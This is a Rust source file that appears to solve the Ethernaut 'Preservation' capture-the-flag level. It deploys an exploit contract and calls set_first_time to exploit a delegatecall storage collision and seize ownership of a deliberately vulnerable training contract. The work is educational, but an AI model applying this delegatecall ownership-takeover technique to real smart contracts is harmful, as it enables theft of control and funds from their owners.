use crate::abi::preservation_exploit::PreservationExploit;
use async_trait::async_trait;
use ctf::ethernaut::lvl16_preservation::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 16: Preservation
     *
     * This contract utilizes a library to store two
     * different times for two different timezones.
     * The constructor creates two instances
     * of the library for each time to be stored.
     *
     * The goal of this level is for you to claim
     * ownership of the instance you are given.
     *
     * Things that might help
     * - Look into Solidity's documentation on the
     *   `delegatecall` low level function, how it
     *   works, how it can be used to delegate
     *   operations to on-chain. Libraries, and what
     *   implications it has on execution scope.
     * - Understanding what it means for `delegatecall`
     *   to be context-preserving.
     * - Understanding how storage variables are stored
     *   and accessed.
     * - Understanding how casting works between
     *   different data types.
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let target = Preservation::new(target.address, offender.to_owned());
        println!(
            "owner = {}\ntimeZone1Library = {}\ntimeZone2Library = {}",
            ethers::utils::to_checksum(&target.owner().await?, None),
            ethers::utils::to_checksum(
                &target.time_zone_1_library().await?,
                None
            ),
            ethers::utils::to_checksum(
                &target.time_zone_2_library().await?,
                None
            )
        );
        println!("Deploying the exploit...");
        PreservationExploit::deploy(offender.to_owned(), target.address())?
            .gas(250_000)
            .send()
            .await?;
        println!("Deployed the exploit!");
        println!(
            "owner = {}\ntimeZone1Library = {}\ntimeZone2Library = {}",
            ethers::utils::to_checksum(&target.owner().await?, None),
            ethers::utils::to_checksum(
                &target.time_zone_1_library().await?,
                None
            ),
            ethers::utils::to_checksum(
                &target.time_zone_2_library().await?,
                None
            )
        );
        println!("Launching the attack...");
        target.set_first_time(0.into()).gas(100_000).send().await?.await?;
        println!(
            "owner = {}\ntimeZone1Library = {}\ntimeZone2Library = {}",
            ethers::utils::to_checksum(&target.owner().await?, None),
            ethers::utils::to_checksum(
                &target.time_zone_1_library().await?,
                None
            ),
            ethers::utils::to_checksum(
                &target.time_zone_2_library().await?,
                None
            )
        );

        Ok(())
    }
}
